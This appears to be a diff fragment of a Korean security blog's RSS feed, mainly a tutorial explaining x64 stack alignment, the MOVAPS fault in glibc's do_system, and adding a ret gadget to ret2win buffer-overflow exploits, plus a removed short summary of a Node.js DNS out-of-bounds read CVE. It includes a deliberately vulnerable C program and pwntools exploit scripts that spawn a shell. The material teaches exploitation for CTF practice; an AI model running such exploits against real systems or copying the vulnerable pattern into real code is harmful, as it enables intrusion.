title="MOVAPS"></a>MOVAPS</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/11.png"></p><p>이 규칙을 꼭 지켜야 하는가? 물론 아닙니다. 방금 전에도 설명했듯이 유연하게 어겼다가 지켰다가 할 수 있습니다. 그리고 stack alignment는 효율을 높이기 위해 유지한다고도 설명했다시피 지키지 않아도 프로그램이 동작하는데 아무 문제없습니다. 다만 효율이 좀 떨어질 뿐… 물론 예외가 존재하는데 몇몇 intel/AMD cpu에서 SSE instruction을 실행할 때  stack alignment가 깨져있으면 segmentation fault가 발생합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/12.png"></p><p>그리고 <a href="http://qcd.phys.cmu.edu/QCDcluster/intel/vtune/reference/vc181.htm">MOVAPS</a>가 바로 SSE intruction 중 하나입니다. XMM 레지스터끼리 혹은 XMM 레지스터와 메모리 사이에서 double quadword( 16byte ) 크기의 데이터를 옮기는 인스트럭션인데, 메모리의 align 여부를 강제합니다.</p><pre><code class="hljs c">&lt;do_system+<span class="hljs-number">364</span>&gt; movaps xmmword ptr [rsp + <span class="hljs-number">0x50</span>], xmm0</code></pre><p>XMM 레지스터와 메모리 사이에서 데이터를 옮길 때, 메모리의 align이 깨져있으면 general protection( #GP / SIGSEGV ) fault를 발생시킵니다. 그리고 Ubuntu 18.04부터 이 movaps 인스트럭션이 <code>do_system()</code>을 포함한 여러 멀티미디어 오퍼레이션에 추가되어 exploit을 작성할 때 stack alignment를 신경 써야 합니다.</p><h1 id="JMP-vs-CALL-vs-RET"><a href="#JMP-vs-CALL-vs-RET" class="headerlink" title="JMP vs CALL vs RET"></a>JMP vs CALL vs RET</h1><p>그래서 Exploit이랑 stack align이 깨지는 거랑 무슨 상관인데? 그래서 왜 16.04에선 쉘을 띄우던 공격 코드가 18.04부턴 작동 안 하는 건데? 이거를 이해하려면 우선 control intsruction들의 차이를 알아야 합니다. 생각보다 모르는 사람이 많더라고… 각 인스트럭션마다 스택의 변화, 더 자세히 말하자면 RSP의 변화가 어떤지 알아야 합니다.</p><h2 id="1-JMP"><a href="#1-JMP" class="headerlink" title="1. JMP"></a>1. JMP</h2><blockquote><p>Transfers program control to a different point in the instruction stream <strong>without</strong> recording <strong>return information</strong>.</p></blockquote><p>단순히 프로그램의 흐름을 옮김. 인용구를 보면 알겠지만 리턴 정보를 저장하지 않습니다. jmp 인스트럭션으로 인한 스택의 변화는 없다고 생각하시면 됩니다.</p><h2 id="2-CALL"><a href="#2-CALL" class="headerlink" title="2. CALL"></a>2. CALL</h2><p>반면 call 인스트럭션은 프로그램의 흐름을 옮기는 것이 아니라 subroutine에 잠시 들렀다가 돌아오는 것이기 때문에 리턴 정보를 저장합니다. 그리고 그 리턴 정보는 stack에 push 하기 때문에 call 인스트럭션을 실행한 뒤엔 RSP의 값이 8만큼 감소합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/13.png"></p><p>RSP : <code>0x7fffffffe030</code></p><p>call hello 인스트럭션이 실행되면 &lt;main+18&gt;을 stack에 push 하겠죠?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/14.png"></p><p>RSP : <code>0x7fffffffe028</code></p><p>따라서 정상적으로 호출된 함수의 entry point에선 RSP+8이 16의 배수가 되는 겁니다. 여기서 꼭 기억하셔야 할 것이 Call을 실행한 직후엔 일시적으로 stack align이 깨진다는 겁니다.</p><h2 id="3-RET"><a href="#3-RET" class="headerlink" title="3. RET"></a>3. RET</h2><pre><code class="hljs c">pop ripjmp rip</code></pre><p>call을 설명할 때 sub routine에 잠시 들렀다 돌아간다고 했습니다. 물론 이 모든 동작을 call이 다 하진 않고, 원래의 인스트럭션 스트림으로 다시 돌아가는 동작은  ret이 대신해줍니다.</p><p>ret은 두 인스트럭션을 하나로 합쳐 놨다고 생각하시면 되는데, call이 저장해놓은 리턴 정보를 스택에서 빼내어 jmp 합니다. 즉, RSP값이 8만큼 증가한다는 뜻입니다.</p><p>!<img src="/2020/12/06/fabu1ous/x64-stack-alignment/15.png"></p><p>RSP : <code>0x7fffffffe028</code></p><p>위 스크린샷은 ret을 실행하기 직전의 상황입니다. RSP 값을 보면 아시겠지만 ret을 실행하기 직전엔 stack align이 깨져있습니다. 이는 함수 에필로그의 leave 명령어 혹은 pop rbp의 결과겠죠?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/16.png"></p><p>RSP : <code>0x7fffffffe030</code></p><p>그리고 ret을 실행하면 RSP가 8만큼 증가하고 stack align이 다시 맞춰집니다.</p><h2 id="정리"><a href="#정리" class="headerlink" title="정리"></a>정리</h2><ul><li>call : RSP-=8 → 일시적으로 stack align을 깸</li><li>ret : RSP+=8 → leave 명령어로 깨진 stack align을 다시 맞춤</li></ul><h1 id="Abnormal-call"><a href="#Abnormal-call" class="headerlink" title="Abnormal call"></a>Abnormal call</h1><p>자 이쯤 되면 대충 눈치채셨을 거 같은데, BOF공격을 할 때 ret으로 함수를 호출하죠? shellcode를 실행하는 건 논외로 치고, ret2libc( RTL )나 ROP로 BOF exploit을 하게 될 텐데 call이 아니라 ret으로 함수를 호출하기 때문에 stack alignment가 깨지게 되는 겁니다.</p><h2 id="vuln-c"><a href="#vuln-c" class="headerlink" title="vuln.c"></a>vuln.c</h2><pre><code class="hljs c"><span class="hljs-comment">// vuln.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">win</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">char</span> buf[<span class="hljs-number">16</span>];read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">128</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;$ gcc -o vuln vuln.c -no-pie -fno-<span class="hljs-built_in">stack</span>-protector</code></pre><p>정말 간단한 BOF 예제로 확인해보죠. vuln.c를 작성하고 컴파일해줍시다. BOF를 할 거니까 당연히 stack canary는 해제해주세요.</p><h2 id="bof-py"><a href="#bof-py" class="headerlink" title="bof.py"></a>bof.py</h2><pre><code class="hljs python"><span class="hljs-comment"># bof.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)gdb.attach(p)win = <span class="hljs-number">0x401156</span>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span> + p64(win)p.sendline(payload)p.interactive()$ python3 bof.py</code></pre><p><code>main()</code>의 return 주소를 <code>win()</code> 함수의 entry point로 덮어쓰는 공격 코드입니다.</p><h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/17.png"></p><pre><code class="hljs bash">pwndbg&gt; bp main+45pwndbg&gt; c</code></pre><p><code>main()</code>의 ret에 break point를 걸고 <code>win()</code> 함수가 호출된 후의 stack 상황을 봅시다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/18.png"></p><pre><code class="hljs bash">pwndbg&gt; ni</code></pre><p>ret으로 함수 <code>win()</code>의 entry point에 도달하면</p><p>프롤로그를 실행하고 나면 stack alignment가 깨지게 됩니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/19.png"></p><p>컴퓨터는 stack이 항상 align 돼있다고 가정하고 그 상태를 유지하려고 합니다. 즉, <code>win()</code>에서 깨져버린 alignment를 깨진 상태로 유지하게 되고, <code>win()</code> 이후에 호출되는 함수들의 stack alignment는 깨진 상태가 됩니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/20.png"></p><p>그리고 결국 <code>do_system()</code>을 실행하다 movaps에 걸려 segmentation fault를 띄우고 exploit은 실패하게 됩니다.</p><h1 id="RET-sled"><a href="#RET-sled" class="headerlink" title="RET sled"></a>RET sled</h1><p>지금까지 설명한 내용을 이해하셨다면 앞으로 공격 코드를 짜실 때 아무 문제없을 거라 생각합니다. 그래도 여기서 글을 마무리 짓긴 애매하니 해결 방법을 알아보죠.</p><pre><code class="hljs python"><span class="hljs-comment">#bof2.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)win = <span class="hljs-number">0x401156</span>ret = <span class="hljs-number">0x40119a</span> <span class="hljs-comment"># ret sled</span>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span> + p64(ret) + p64(win)p.sendline(payload)p.interactive()</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/21.png"></p><pre><code class="hljs bash">$ python3 bof2.py</code></pre><p>네. 정말 별거 없습니다. ret 가젯을 하나 더 추가해서 RSP의 위치를 8만큼 조정해주면 BOF 공격을 할 때 stack alignment를 유지할 수 있습니다. 너무 단순하고 당연해서 더 설명할 게 없네요.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/22.png"></p><p>짠!</p><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>RET sled 말고도 stack alignment를 유지하면서 ROP 하는 방법은 많습니다. 사실 한 가지 방법 더 보여드리려고 했는데 그건 endbr64랑 CET까지 설명해야 돼서 기회가 되면 따로 글을 작성하겠습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/23.png"></p>]]></content:encoded>
+      <content:encoded><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/1.png"></p><p>비밀 프로젝트( 아직 비밀, 쉿! ) 때문에 Ubuntu 20.04에서 몇 가지 테스트를 하다가 처음 보는 에러에 당황했습니다. <code>do_system+364: movaps</code> 인스트럭션에서 Segmentation Fault가 발생하더라고요.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/2.png"></p><p>알아보니까 Ubuntu 18.04부터 <code>do_system()</code>에 <code>movaps</code>인스트럭션이 하나 추가됐습니다. 조금 뒤에 자세히 설명하겠지만, x64 리눅스에선 16바이트로 stack alignment를 지켜야 합니다. stack alignment가 깨져있으면 이 인스트럭션을 실행하다 Segmentation Fault가 뜹니다.</p><p>이놈 때문에 18.04 이전 버전에서 익스 되는 BOF 공격코드가 18.04 이후 버전에서는 사용할 수 없는 경우도 있다고 합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/3.png"></p><p><em>故 Fabu1ous의 네이버 블로그 (2018.10 ~ 2019.12)</em></p><p>지금까지 푼 포너블 문제만 백몇 개쯤 되고 수없이 많은 <code>system(&quot;/bin/sh&quot;)</code>을 호출해 봤는데 어째서 이 사실을 이제야 알게 된 거지?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/4.png"></p><p>작년(2019) 크리스마스 CTF에서 단순 ROP문제를 익스 못해서 화났던 기억이 머리를 스치고 지나갔습니다. 분명 로컬에선 익스가 되던 게 리모트 익스가 안돼서 팀원에게 코드를 넘겨주고 다른 문제 보러 갔었죠. 그때 못 풀었던 ROP문제는 solo_test란 문제였는데 그때 로컬 환경이 우분투 16.04였습니다… 후…</p><p>대회 끝나고 바로 며칠 뒤에 이 주제에 대한 라업이 하나 올라왔는데 1년이 지난 지금에서야 찾아본 제 자신이 너무 밉네요. ROP문제라고 대수롭지 않게 그냥 넘겨버린 것에 반성하며 지금이라도 공부해봅시다.</p><blockquote><p>늦었다고 생각할 때가 진짜 너무 늦었다 -박명수-</p></blockquote><h1 id="x64-Stack-Alignment"><a href="#x64-Stack-Alignment" class="headerlink" title="x64 Stack Alignment"></a>x64 Stack Alignment</h1><p>stack alignment는 stack의 top이 16의 배수로 유지된 상태며 메모리의 access cycle을 최소한으로 줄이기 위해 사용합니다. ( CS를 공부하다가 “왜?”라는 질문을 던지면 십중팔구 “효율”이라는 대답이 돌아옴, 더 자세한 건 직접 찾아보시길 ) 그리고 이 stack alignment를 유지하기 위해 RSP의 위치가 정해지는 규칙이 있습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/5.png"></p><p>Linux 64 <a href="https://software.intel.com/sites/default/files/article/402129/mpx-linux64-abi.pdf">ABI</a>( Application binary interface )에 따르면 프로그램의 흐름( control )이 함수의 entry로 옮겨지는 시점에선 스택 포인터(rsp)+8이 항상 16의 배수여야 합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/6.png"></p><p>방금 전엔 RSP를 16의 배수로 유지하는 게 stack alignment라 해놓고 갑자기 RSP+8이 16의 배수라니, 뭐라는 거야?</p><p>무슨 소린지 모르겠죠? 설명이 뭐 같이 쓰여있어서 그렇지 사실 아주 간단합니다.</p><pre><code class="hljs c"><span class="hljs-comment">// test.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hello</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello stack alignment\\n&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;hello();<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><pre><code class="hljs bash">$ gcc -o <span class="hljs-built_in">test</span> test.c -no-pie$ gdb -q <span class="hljs-built_in">test</span></code></pre><p>간단한 예제를 통해 확인해봅시다. 디버깅할 때 거슬리니 PIE는 해제하고 컴파일하세요. 저는 Ubuntu 20.04와 glibc-2.31를 사용했습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/7.png"></p><pre><code class="hljs bash">pwndbg&gt; bp main</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/8.png"></p><pre><code class="hljs bash">pwndbg&gt; r</code></pre><p>정상적으로 호출된 <code>main()</code> 함수의 entry point입니다. 아직 프롤로그를 실행하기 전이니 RSP+8은 16의 배수겠죠?</p><p>RSP : <code>0x7fffffffe038</code></p><p>RSP+8 : <code>0x7fffffffe040</code></p><p>위 스크린샷을 보면 RSP+8은 <code>0x7fffffffe040</code>이므로 16의 배수가 맞습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/9.png"></p><p>그럼 다들 알다시피 call 인스트럭션으로 함수를 호출하면 stack에 return address를 push 하니까 call 인스트럭션을 실행하기 직전엔 RSP가 16의 배수겠죠?</p><p>RSP : <code>0x7fffffffe030</code></p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/10.png"></p><p>그리고 함수 프롤로그에서 <code>push rbp</code>를 하니까 rbp는 항상 16의 배수겠네요?</p><p>RSP : <code>0x7ffffffffdfe0</code></p><p>대충 정리해보면 stack align을 지키면서 함수를 호출하는 흐름은 다음과 같습니다.</p><ol><li>call 실행 직전 RSP는 16의 배수 ( stack align O )</li><li>함수의 entry point에선 RSP+8이 16의 배수 ( stack align X )</li><li>함수의 프롤로그 실행 후 RSP는 16의 배수 ( stack align O )</li><li>RBP는 항상 16의 배수 ( stack align O )</li></ol><p>사실, 함수를 호출할 때 2번 과정에서 잠시 stack align이 깨지고 3번에서 다시 stack align이 맞춰집니다. 여기서 2번만 똑 떼서 “이 것만 지키시면 stack align입니다.”라고 설명을 써놔서 헷갈리는 겁니다. 이래도 이해 안 되시면 4번만 기억하세요. 4번만 신경 써줘도 공격 코드를 짜는데 아무 지장이 없을 겁니다. 더 자세한 설명은 조금 이따 하겠습니다.</p><h1 id="MOVAPS"><a href="#MOVAPS" class="headerlink" title="MOVAPS"></a>MOVAPS</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/11.png"></p><p>이 규칙을 꼭 지켜야 하는가? 물론 아닙니다. 방금 전에도 설명했듯이 유연하게 어겼다가 지켰다가 할 수 있습니다. 그리고 stack alignment는 효율을 높이기 위해 유지한다고도 설명했다시피 지키지 않아도 프로그램이 동작하는데 아무 문제없습니다. 다만 효율이 좀 떨어질 뿐… 물론 예외가 존재하는데 몇몇 intel/AMD cpu에서 SSE instruction을 실행할 때  stack alignment가 깨져있으면 segmentation fault가 발생합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/12.png"></p><p>그리고 <a href="http://qcd.phys.cmu.edu/QCDcluster/intel/vtune/reference/vc181.htm">MOVAPS</a>가 바로 SSE intruction 중 하나입니다. XMM 레지스터끼리 혹은 XMM 레지스터와 메모리 사이에서 double quadword( 16byte ) 크기의 데이터를 옮기는 인스트럭션인데, 메모리의 align 여부를 강제합니다.</p><pre><code class="hljs c">&lt;do_system+<span class="hljs-number">364</span>&gt; movaps xmmword ptr [rsp + <span class="hljs-number">0x50</span>], xmm0</code></pre><p>XMM 레지스터와 메모리 사이에서 데이터를 옮길 때, 메모리의 align이 깨져있으면 general protection( #GP / SIGSEGV ) fault를 발생시킵니다. 그리고 Ubuntu 18.04부터 이 movaps 인스트럭션이 <code>do_system()</code>을 포함한 여러 멀티미디어 오퍼레이션에 추가되어 exploit을 작성할 때 stack alignment를 신경 써야 합니다.</p><h1 id="JMP-vs-CALL-vs-RET"><a href="#JMP-vs-CALL-vs-RET" class="headerlink" title="JMP vs CALL vs RET"></a>JMP vs CALL vs RET</h1><p>그래서 Exploit이랑 stack align이 깨지는 거랑 무슨 상관인데? 그래서 왜 16.04에선 쉘을 띄우던 공격 코드가 18.04부턴 작동 안 하는 건데? 이거를 이해하려면 우선 control intsruction들의 차이를 알아야 합니다. 생각보다 모르는 사람이 많더라고… 각 인스트럭션마다 스택의 변화, 더 자세히 말하자면 RSP의 변화가 어떤지 알아야 합니다.</p><h2 id="1-JMP"><a href="#1-JMP" class="headerlink" title="1. JMP"></a>1. JMP</h2><blockquote><p>Transfers program control to a different point in the instruction stream <strong>without</strong> recording <strong>return information</strong>.</p></blockquote><p>단순히 프로그램의 흐름을 옮김. 인용구를 보면 알겠지만 리턴 정보를 저장하지 않습니다. jmp 인스트럭션으로 인한 스택의 변화는 없다고 생각하시면 됩니다.</p><h2 id="2-CALL"><a href="#2-CALL" class="headerlink" title="2. CALL"></a>2. CALL</h2><p>반면 call 인스트럭션은 프로그램의 흐름을 옮기는 것이 아니라 subroutine에 잠시 들렀다가 돌아오는 것이기 때문에 리턴 정보를 저장합니다. 그리고 그 리턴 정보는 stack에 push 하기 때문에 call 인스트럭션을 실행한 뒤엔 RSP의 값이 8만큼 감소합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/13.png"></p><p>RSP : <code>0x7fffffffe030</code></p><p>call hello 인스트럭션이 실행되면 &lt;main+18&gt;을 stack에 push 하겠죠?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/14.png"></p><p>RSP : <code>0x7fffffffe028</code></p><p>따라서 정상적으로 호출된 함수의 entry point에선 RSP+8이 16의 배수가 되는 겁니다. 여기서 꼭 기억하셔야 할 것이 Call을 실행한 직후엔 일시적으로 stack align이 깨진다는 겁니다.</p><h2 id="3-RET"><a href="#3-RET" class="headerlink" title="3. RET"></a>3. RET</h2><pre><code class="hljs c">pop ripjmp rip</code></pre><p>call을 설명할 때 sub routine에 잠시 들렀다 돌아간다고 했습니다. 물론 이 모든 동작을 call이 다 하진 않고, 원래의 인스트럭션 스트림으로 다시 돌아가는 동작은  ret이 대신해줍니다.</p><p>ret은 두 인스트럭션을 하나로 합쳐 놨다고 생각하시면 되는데, call이 저장해놓은 리턴 정보를 스택에서 빼내어 jmp 합니다. 즉, RSP값이 8만큼 증가한다는 뜻입니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/15.png"></p><p>RSP : <code>0x7fffffffe028</code></p><p>위 스크린샷은 ret을 실행하기 직전의 상황입니다. RSP 값을 보면 아시겠지만 ret을 실행하기 직전엔 stack align이 깨져있습니다. 이는 함수 에필로그의 leave 명령어 혹은 pop rbp의 결과겠죠?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/16.png"></p><p>RSP : <code>0x7fffffffe030</code></p><p>그리고 ret을 실행하면 RSP가 8만큼 증가하고 stack align이 다시 맞춰집니다.</p><h2 id="정리"><a href="#정리" class="headerlink" title="정리"></a>정리</h2><ul><li>call : RSP-=8 → 일시적으로 stack align을 깸</li><li>ret : RSP+=8 → leave 명령어로 깨진 stack align을 다시 맞춤</li></ul><h1 id="Abnormal-call"><a href="#Abnormal-call" class="headerlink" title="Abnormal call"></a>Abnormal call</h1><p>자 이쯤 되면 대충 눈치채셨을 거 같은데, BOF공격을 할 때 ret으로 함수를 호출하죠? shellcode를 실행하는 건 논외로 치고, ret2libc( RTL )나 ROP로 BOF exploit을 하게 될 텐데 call이 아니라 ret으로 함수를 호출하기 때문에 stack alignment가 깨지게 되는 겁니다.</p><h2 id="vuln-c"><a href="#vuln-c" class="headerlink" title="vuln.c"></a>vuln.c</h2><pre><code class="hljs c"><span class="hljs-comment">// vuln.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">win</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">char</span> buf[<span class="hljs-number">16</span>];read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">128</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;$ gcc -o vuln vuln.c -no-pie -fno-<span class="hljs-built_in">stack</span>-protector</code></pre><p>정말 간단한 BOF 예제로 확인해보죠. vuln.c를 작성하고 컴파일해줍시다. BOF를 할 거니까 당연히 stack canary는 해제해주세요.</p><h2 id="bof-py"><a href="#bof-py" class="headerlink" title="bof.py"></a>bof.py</h2><pre><code class="hljs python"><span class="hljs-comment"># bof.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)gdb.attach(p)win = <span class="hljs-number">0x401156</span>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span> + p64(win)p.sendline(payload)p.interactive()$ python3 bof.py</code></pre><p><code>main()</code>의 return 주소를 <code>win()</code> 함수의 entry point로 덮어쓰는 공격 코드입니다.</p><h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/17.png"></p><pre><code class="hljs bash">pwndbg&gt; bp main+45pwndbg&gt; c</code></pre><p><code>main()</code>의 ret에 break point를 걸고 <code>win()</code> 함수가 호출된 후의 stack 상황을 봅시다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/18.png"></p><pre><code class="hljs bash">pwndbg&gt; ni</code></pre><p>ret으로 함수 <code>win()</code>의 entry point에 도달해서 프롤로그를 실행하고 나면 stack alignment가 깨지게 됩니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/19.png"></p><p>컴퓨터는 stack이 항상 align 돼있다고 가정하고 그 상태를 유지하려고 합니다. 즉, <code>win()</code>에서 깨져버린 alignment를 깨진 상태로 유지하게 되고, <code>win()</code> 이후에 호출되는 함수들의 stack alignment는 깨진 상태가 됩니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/20.png"></p><p>그리고 결국 <code>do_system()</code>을 실행하다 movaps에 걸려 segmentation fault를 띄우고 exploit은 실패하게 됩니다.</p><h1 id="RET-sled"><a href="#RET-sled" class="headerlink" title="RET sled"></a>RET sled</h1><p>지금까지 설명한 내용을 이해하셨다면 앞으로 공격 코드를 짜실 때 아무 문제없을 거라 생각합니다. 그래도 여기서 글을 마무리 짓긴 애매하니 해결 방법을 알아보죠.</p><pre><code class="hljs python"><span class="hljs-comment">#bof2.py</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./vuln&#x27;</span>)win = <span class="hljs-number">0x401156</span>ret = <span class="hljs-number">0x40119a</span> <span class="hljs-comment"># ret sled</span>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">24</span> + p64(ret) + p64(win)p.sendline(payload)p.interactive()</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/21.png"></p><pre><code class="hljs bash">$ python3 bof2.py</code></pre><p>네. 정말 별거 없습니다. ret 가젯을 하나 더 추가해서 RSP의 위치를 8만큼 조정해주면 BOF 공격을 할 때 stack alignment를 유지할 수 있습니다. 너무 단순하고 당연해서 더 설명할 게 없네요.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/22.png"></p><p>짠!</p><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>RET sled 말고도 stack alignment를 유지하면서 ROP 하는 방법은 많습니다. 사실 한 가지 방법 더 보여드리려고 했는데 그건 endbr64랑 CET까지 설명해야 돼서 기회가 되면 따로 글을 작성하겠습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/23.png"></p>]]></content:encoded>
       
       
       <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
@@ -367,6 +603,8 @@
       <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
       
       
+      <category domain="https://hackyboiz.github.io/tags/arbitrary-file-download/">arbitrary file download</category>
+      
       <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
       
       <category domain="https://hackyboiz.github.io/tags/lolbin/">lolbin</category>
@@ -374,8 +612,6 @@
       <category domain="https://hackyboiz.github.io/tags/lolbas/">lolbas</category>
       
       <category domain="https://hackyboiz.github.io/tags/appinstaller/">appinstaller</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/arbitrary-file-download/">arbitrary file download</category>
       
       
       <comments>https://hackyboiz.github.io/2020/12/03/idioth/2020-12-03/#disqus_thread</comments>
@@ -445,241 +681,6 @@
       
       
       <comments>https://hackyboiz.github.io/2020/12/01/l0ch/2020-12-01/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[하루한줄] CVE-2020-8277: Node.js OOB Read를 통한 Denial of Service</title>
-      <link>https://hackyboiz.github.io/2020/11/30/idioth/2020-11-30/</link>
-      <guid>https://hackyboiz.github.io/2020/11/30/idioth/2020-11-30/</guid>
-      <pubDate>Mon, 30 Nov 2020 09:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://livingbeef.blogspot.com/2020/11/cve-2020-8277-ana</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://livingbeef.blogspot.com/2020/11/cve-2020-8277-analysis-from-nodejs-code.html">CVE-2020-8277 Analysis: From Node.JS code to OOB Reads/Fail-Check</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Node.js<ul><li>&lt; 15.2.1</li><li>&lt; 14.15.1</li><li>&lt; 12.19.1</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Node.js에서 OOB(Out of Bounds) Read를 통해 Denial of Service를 트리거할 수 있는 취약점이 발견되었습니다. 해당 취약점은 많은 양의 DNS record를 <a href="https://github.com/nodejs/node/blob/642174a31f7c2d3a8352002095d35a2b34c1126c/src/cares_wrap.cc">c-ares 라이브러리</a>에서 TTL record를 parsing 할 때 배열 길이의 계산을 잘못하면서 일어나는 취약점입니다.</p><p>c-ares 라이브러리의 <code>ares_parse_aaaa_reply</code> 함수는 response를 포함하는 <code>char* abuffer</code>, response의 길이인 <code>alen</code>, DNS response가 반환될 구조체 포인터 <code>host</code>, TTL 배열인 <code>addrttls / naddrttls</code>를 인자로 갖습니다. <code>addrttls</code>는 반환된 TTL의 주소로 채워지는 배열이고, <code>naddrttls</code>는 반환할 TTL의 최대 값입니다. response의 reply 개수가 <code>addrttls</code> 배열보다 클 경우  <code>naddrttls</code>에서 확인 후 256개의 TTL만 처리되고 나머지 부분은 잘리게 됩니다. 하지만 취약점은 TTL의 개수에 대한 잘못된 처리가 아니라 response의 reply 개수를 잘못 계산하는 것에서 일어납니다.</p><ol><li>reply의 개수를 새서 <code>naddrs</code>에 저장</li><li>TTL 배열 작성(<code>naddrttls</code>에 의해 잘린 <code>addrttls</code>)</li><li><code>naddrttls</code> 재작성 - 실제 TTL 배열에 작성된 값보다 큰 지 확인하지 않고 <code>naddrs</code>를 집어넣음</li></ol><p>따라서 반환된 <code>naddrttls</code>가 작성된 reply의 TTL 개수보다 커지므로 OOB read가 가능하고 이를 악용하여 Denial of Service 공격을 트리거할 수 있습니다.</p><p>해당 취약점은 <code>naddrttls</code>에 <code>naddrs</code> 값을 넣을 때 <code>naddrs</code>의 값이 <code>naddrttls</code>보다 클 경우 <code>naddrttls</code> 값을 넣는 것으로 패치되었습니다.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span>(naddrttls)&#123;*naddrttls = (naddrs &gt; *naddrsttls) ? *naddrttls:naddrs;&#125;</code></pre>]]></content:encoded>
-      
-      
